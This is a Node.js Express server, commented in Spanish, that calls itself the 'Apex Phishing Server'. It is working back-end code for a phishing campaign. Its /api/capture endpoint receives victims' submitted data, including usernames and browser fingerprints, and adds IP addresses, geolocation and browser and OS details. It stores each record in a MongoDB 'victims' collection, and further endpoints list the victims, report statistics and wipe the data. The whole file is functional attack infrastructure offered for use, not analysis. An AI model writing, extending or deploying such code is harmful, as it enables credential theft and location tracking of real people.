const express = require('express');
const cors = require('cors');
const geoip = require('geoip-lite');
const { MongoClient, ServerApiVersion } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Configuration
const uri = process.env.MONGODB_URI;

if (!uri) {
  console.error('❌ MONGODB_URI no está configurada en las variables de entorno');
  process.exit(1);
}

const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
  tls: true,
  tlsAllowInvalidCertificates: false,
  tlsAllowInvalidHostnames: false,
  connectTimeoutMS: 30000,
  socketTimeoutMS: 30000,
  maxPoolSize: 10,
  minPoolSize: 2
});

let victimsCollection;

// Conectar a MongoDB Atlas
async function connectDB() {
  try {
    await client.connect();
    await client.db("admin").command({ ping: 1 });
    console.log("✅ Conectado a MongoDB Atlas");
    
    const db = client.db('apex-db');
    victimsCollection = db.collection('victims');
    
    // Crear índices
    await victimsCollection.createIndex({ fingerprint: 1 }, { unique: true });
    await victimsCollection.createIndex({ timestamp: -1 });
    console.log("📊 Índices creados en MongoDB");
    
  } catch (error) {
    console.error("❌ Error conectando a MongoDB:", error);
    process.exit(1);
  }
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Función para parsear User-Agent
function parseUserAgent(ua) {
  const browser = { name: 'Unknown', version: 'Unknown' };
  const os = { name: 'Unknown', version: 'Unknown', platform: 'Unknown' };

  // Detectar OS
  if (ua.includes('Windows NT 10.0')) os.name = 'Windows 10/11';
  else if (ua.includes('Windows NT 6.3')) os.name = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.2')) os.name = 'Windows 8';
  else if (ua.includes('Windows NT 6.1')) os.name = 'Windows 7';
  else if (ua.includes('Mac OS X')) {
    os.name = 'macOS';
    const match = ua.match(/Mac OS X ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  } else if (ua.includes('Android')) {
    os.name = 'Android';
    const match = ua.match(/Android ([0-9.]+)/);
    if (match) os.version = match[1];
  } else if (ua.includes('Linux')) os.name = 'Linux';
  else if (ua.includes('iPhone') || ua.includes('iPad')) {
    os.name = 'iOS';
    const match = ua.match(/OS ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  }

  // Detectar Platform
  if (ua.includes('Win')) os.platform = 'Windows';
  else if (ua.includes('Mac')) os.platform = 'MacOS';
  else if (ua.includes('Linux')) os.platform = 'Linux';
  else if (ua.includes('Android')) os.platform = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os.platform = 'iOS';

  // Detectar Browser
  if (ua.includes('Edg/')) {
    browser.name = 'Edge';
    const match = ua.match(/Edg\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
    browser.name = 'Chrome';
    const match = ua.match(/Chrome\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Firefox/')) {
    browser.name = 'Firefox';
    const match = ua.match(/Firefox\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
    browser.name = 'Safari';
    const match = ua.match(/Version\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
    browser.name = 'Opera';
    const match = ua.match(/(?:Opera|OPR)\/([0-9.]+)/);
    if (match) browser.version = match[1];
  }

  return { browser, os };
}

// Verificar si la víctima ya fue capturada
async function isAlreadyCaptured(fingerprint) {
  try {
    const count = await victimsCollection.countDocuments({ fingerprint });
    return count > 0;
  } catch (error) {
    console.error("Error verificando duplicado:", error);
    return false;
  }
}

// Guardar víctima en MongoDB
async function saveVictim(victimData) {
  try {
    victimData.timestamp = new Date();
    await victimsCollection.insertOne(victimData);
    console.log(`🎯 Nueva víctima capturada: ${victimData.username} [${victimData.fingerprint.substring(0, 8)}...]`);
    return true;
  } catch (error) {
    if (error.code === 11000) {
      console.log(`⚠️ Víctima duplicada ignorada: ${victimData.fingerprint.substring(0, 8)}...`);
      return false;
    }
    console.error("Error guardando víctima:", error);
    return false;
  }
}

// Obtener todas las víctimas
async function getVictims() {
  try {
    return await victimsCollection.find({}).sort({ timestamp: -1 }).toArray();
  } catch (error) {
    console.error("Error obteniendo víctimas:", error);
    return [];
  }
}

// === ROUTES ===

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    server: 'Apex Phishing Server',
    version: '3.0.0',
    database: 'MongoDB Atlas ☁️',
    timestamp: new Date().toISOString()
  });
});

// Capturar datos de víctima
app.post('/api/capture', async (req, res) => {
  try {
    const data = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress;

    // Verificar fingerprint único
    if (await isAlreadyCaptured(data.fingerprint)) {
      return res.json({ 
        success: false, 
        message: 'Duplicate fingerprint detected',
        duplicate: true 
      });
    }

    // Enriquecer con datos de geolocalización
    const geo = geoip.lookup(clientIP);
    if (geo) {
      data.network = data.network || {};
      data.network.ip = clientIP;
      data.network.country = geo.country;
      data.network.region = geo.region;
      data.network.timezone = geo.timezone;
      data.network.city = geo.city || 'Unknown';
      data.network.latitude = geo.ll?.[0] || null;
      data.network.longitude = geo.ll?.[1] || null;
    } else {
      data.network = data.network || {};
      data.network.ip = clientIP;
    }

    // Parsear User-Agent
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const { browser, os } = parseUserAgent(userAgent);
    
    if (!data.browser) data.browser = {};
    data.browser.name = browser.name;
    data.browser.version = browser.version;
    data.browser.userAgent = userAgent;

    if (!data.os) data.os = {};
    data.os.name = os.name;
    data.os.version = os.version;
    data.os.platform = os.platform;

    // Guardar en MongoDB
    const saved = await saveVictim(data);
    
    if (saved) {
      res.json({ 
        success: true, 
        message: 'Data captured successfully',
        victimId: data.fingerprint.substring(0, 8)
      });
    } else {
      res.json({ 
        success: false, 
        message: 'Failed to save data' 
      });
    }

  } catch (error) {
    console.error('Error en /api/capture:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
});

// Obtener estadísticas
app.get('/api/stats', async (req, res) => {
  try {
    const victims = await getVictims();
    
    const stats = {
      totalVictims: victims.length,
      lastCapture: victims.length > 0 ? victims[0].timestamp : null,
      uniqueCountries: [...new Set(victims.map(v => v.network?.country).filter(Boolean))].length,
      browsers: {},
      operatingSystems: {},
      devices: {},
      recentVictims: victims.slice(0, 5).map(v => ({
        username: v.username,
        timestamp: v.timestamp,
        country: v.network?.country || 'Unknown',
        browser: v.browser?.name || 'Unknown',
        os: v.os?.name || 'Unknown'
      }))
    };

    // Contar browsers
    victims.forEach(v => {
      const browser = v.browser?.name || 'Unknown';
      stats.browsers[browser] = (stats.browsers[browser] || 0) + 1;
    });

    // Contar OS
    victims.forEach(v => {
      const os = v.os?.name || 'Unknown';
      stats.operatingSystems[os] = (stats.operatingSystems[os] || 0) + 1;
    });

    // Contar dispositivos
    victims.forEach(v => {
      const device = v.device?.type || 'Unknown';
      stats.devices[device] = (stats.devices[device] || 0) + 1;
    });

    res.json(stats);
  } catch (error) {
    console.error('Error en /api/stats:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Obtener todas las víctimas
app.get('/api/victims', async (req, res) => {
  try {
    const victims = await getVictims();
    res.json({ victims, total: victims.length });
  } catch (error) {
    console.error('Error en /api/victims:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Limpiar todas las víctimas (para testing)
app.delete('/api/clear', async (req, res) => {
  try {
    const result = await victimsCollection.deleteMany({});
    console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} víctimas eliminadas`);
    res.json({ 
      success: true, 
      message: `${result.deletedCount} victims cleared`,
      deletedCount: result.deletedCount
    });
  } catch (error) {
    console.error('Error en /api/clear:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
});

// Manejo de cierre graceful
process.on('SIGINT', async () => {
  console.log('\n🛑 Cerrando servidor...');
  try {
    await client.close();
    console.log('✅ Conexión a MongoDB cerrada');
    process.exit(0);
  } catch (error) {
    console.error('❌ Error cerrando MongoDB:', error);
    process.exit(1);
  }
});

// Iniciar servidor
async function startServer() {
  await connectDB();
  app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`🌐 Entorno: ${process.env.NODE_ENV || 'development'}`);
  });
}

startServer().catch(error => {
  console.error('❌ Error iniciando servidor:', error);
  process.exit(1);
});